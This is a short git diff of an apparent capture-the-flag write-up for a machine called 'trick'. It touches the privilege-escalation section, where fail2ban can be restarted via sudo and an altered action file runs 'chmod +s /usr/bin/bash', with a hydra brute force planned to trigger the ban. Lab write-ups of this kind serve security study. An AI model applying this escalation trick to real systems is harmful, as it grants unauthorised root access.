@@ -139,7 +139,7 @@ drwxr-xr-x  2 michael michael  4096 May 11 21:07 Templates
 drwxr-xr-x  2 michael michael  4096 May 11 21:07 Videos
 -rw-------  1 michael michael 12716 Sep 17 16:33 .viminfo
 ```
-and he has access to restart fail2ban  
+he has access to restart fail2ban  
 ```bash
 -bash-5.0$ sudo -l
 Matching Defaults entries for michael on trick:
@@ -184,8 +184,8 @@ cp iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.conf
 ```
 then restarting the daemon  
 ```bash
-actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>
-            chmod +s /usr/bin/bash
+sudo /etc/init.d/fail2ban restart
+[ ok ] Restarting fail2ban (via systemctl): fail2ban.service.
 ```
 Now of course we need to trigger the ban, lets do a bruteforce attach with hydra  
 ```bash
